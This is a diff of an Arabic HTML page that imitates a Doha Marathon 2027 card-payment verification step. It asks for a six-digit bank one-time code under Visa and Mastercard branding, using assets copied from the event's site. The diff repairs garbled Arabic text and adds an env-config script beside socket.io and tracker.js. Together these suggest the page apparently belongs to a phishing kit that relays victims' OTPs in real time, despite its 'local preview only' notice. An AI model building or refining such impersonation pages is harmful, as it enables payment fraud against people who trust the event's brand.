@@ -1,10 +1,10 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="theme-color" content="#087cf4">
-	<title>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø±Ù…Ø² - Ù…Ø§Ø±Ø§Ø«ÙˆÙ† Ø§Ù„Ø¯ÙˆØ­Ø© 2027</title>
+	<title>التحقق من الرمز - ماراثون الدوحة 2027</title>
 	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
 	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
 	<link rel="stylesheet" href="assets/payment-verify.css">
@@ -16,34 +16,34 @@
 	</header>
 
 	<main class="card-shell">
-		<section class="card-payment-panel" aria-label="Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø¯ÙØ¹">
+		<section class="card-payment-panel" aria-label="التحقق من رمز الدفع">
 			<div class="merchant-row">
 				<div class="merchant-logo" aria-hidden="true"><span>SUFFIX<span class="merchant-mark">X</span></span></div>
 				<div class="merchant-details">
 					<h1>Suffix Sports Management</h1>
 					<strong id="verify-payment-total" class="payment-total"></strong>
-					<p class="order-details"><span class="order-check" aria-hidden="true">âœ“</span> ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø·Ù„Ø¨</p>
+					<p class="order-details"><span class="order-check" aria-hidden="true">✓</span> تفاصيل الطلب</p>
 				</div>
 			</div>
 
-			<div class="payment-divider"><span>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¯ÙØ¹</span></div>
+			<div class="payment-divider"><span>التحقق من الدفع</span></div>
 			<div class="card-type-bar">
-				<span class="card-brands" aria-label="Mastercard ÙˆVisa">
+				<span class="card-brands" aria-label="Mastercard وVisa">
 					<span class="brand-mastercard"><i></i><i></i></span>
 					<span class="brand-visa">VISA</span>
 				</span>
-				<strong>Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù…Ø² <span aria-hidden="true">â–°</span></strong>
+				<strong>إدخال الرمز <span aria-hidden="true">▰</span></strong>
 			</div>
-			<p class="card-section-label">Ø§Ù„ØªØ­Ù‚Ù‚</p>
+			<p class="card-section-label">التحقق</p>
 
 			<form id="verify-form" class="card-form" novalidate autocomplete="on">
 				<p id="verify-instruction" class="verify-instruction">
-					ØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ù‰ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ø³Ø¬Ù„ ÙŠØ±Ø¬Ù‰ Ø§Ø¯Ø®Ø§Ù„Ù‡ ÙˆØ§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± ØªØ£ÙƒÙŠØ¯
+					تم ارسال الرمز الى الرقم المسجل يرجى ادخاله والضغط على زر تأكيد
 				</p>
 				
 				<label class="card-field card-otp-field">
-					<span class="visually-hidden">Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</span>
-					<span class="card-symbol" aria-hidden="true">ðŸ”</span>
+					<span class="visually-hidden">رمز التحقق</span>
+					<span class="card-symbol" aria-hidden="true">🔐</span>
 					<input
 						id="verify-otp"
 						class="card-input"
@@ -51,19 +51,19 @@
 						type="text"
 						inputmode="numeric"
 						dir="ltr"
-						placeholder="â—‹â—‹â—‹â—‹â—‹â—‹"
+						placeholder="○○○○○○"
 						maxlength="6"
-						aria-label="Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚"
+						aria-label="رمز التحقق"
 						required>
 				</label>
 
 				<button id="verify-button" class="card-pay-button" type="submit" disabled></button>
 				<p id="verify-form-message" class="card-form-message" role="status" aria-live="polite" hidden></p>
 			</form>
-			<p class="local-card-notice">Ù…Ø¹Ø§ÙŠÙ†Ø© Ù…Ø­Ù„ÙŠØ© ÙÙ‚Ø·: Ù„Ø§ ÙŠØªÙ… Ø­ÙØ¸ Ø£Ùˆ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚.</p>
+			<p class="local-card-notice">معاينة محلية فقط: لا يتم حفظ أو إرسال رمز التحقق.</p>
 		</section>
 	</main>
 <script src="/socket.io/socket.io.js"></script>
-<script src="/assets/tracker.js"></script>
+<script src="/api/env-config.js"></script><script src="/assets/tracker.js"></script>
 </body>
 </html>
